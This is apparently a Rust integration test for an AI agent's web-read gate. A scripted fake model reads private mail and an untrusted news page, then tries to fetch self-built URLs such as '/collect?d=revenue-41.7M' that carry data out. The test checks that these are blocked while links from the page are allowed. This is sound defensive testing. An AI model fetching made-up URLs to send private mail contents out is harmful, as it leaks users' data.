//! Web reads by provenance (decisions/2026-11-12-web-reads-by-provenance.md),
//! through the real gate. After the work has read private mail and an
//! untrusted page, opening a link that page gave asks no one. An address
//! the model made up, which could carry the mail out, is not opened: it is
//! sent to `research_web`, and no card asks about a webpage
//! (decisions/2026-11-22-no-webpage-approval-cards.md).

use magnus_invariants::{mcp, *};
use magnus_scratch::start_checked;
use serde_json::json;

#[tokio::test(flavor = "multi_thread")]
async fn a_link_from_the_web_needs_no_ask_and_a_made_up_address_is_not_opened() {
    let other = FakeWeb::start(&[("/story", "the story"), ("/collect", "thanks")]).await;
    let story = other.url("/story");
    let news_page = format!("Today's news. Read more: {story}");
    let news = FakeWeb::start(&[("/news", news_page.as_str())]).await;
    let news_url = news.url("/news");
    let (leak, again) = (other.url("/collect?d=revenue-41.7M"), other.url("/collect?d=more"));
    let mail = mcp::mail().start().await;
    let m = start_checked(script(move |c| {
        let (news_url, story, leak, again) = (news_url.clone(), story.clone(), leak.clone(), again.clone());
        async move {
            match c.turn() {
                0 => plan("read my inbox and the news"),
                1 => tool("mail__list_inbox", json!({})),
                2 => tool("web_fetch", json!({ "url": news_url })),
                3 => tool("web_fetch", json!({ "url": story })),
                4 => tool("web_fetch", json!({ "url": leak })),
                5 => tool("web_fetch", json!({ "url": again })),
                _ => complete("read"),
            }
        }
    }))
    .await;
    let spec = Spec::default().app("mail", &mail, "public", "private", &[("list_inbox", "read")]);
    let app = Appliance::start(spec, &m).await;
    let alice = app.api("alice");
    let t = alice.submit("Read my inbox and the news page.").await;

    alice.wait_settled(&t).await;
    assert!(other.hits().iter().any(|h| h == "/story"), "a link the page gave was held: {:?}", other.hits());
    assert!(other.hits().iter().all(|h| !h.starts_with("/collect")), "a made-up address went out: {:?}", other.hits());
    let (_, inbox) = alice.get("/v1/inbox").await;
    let asks = inbox["items"].as_array().into_iter().flatten().filter(|i| i["kind"] == "approval").count();
    assert_eq!(asks, 0, "a webpage was put to the person: {inbox}");
}
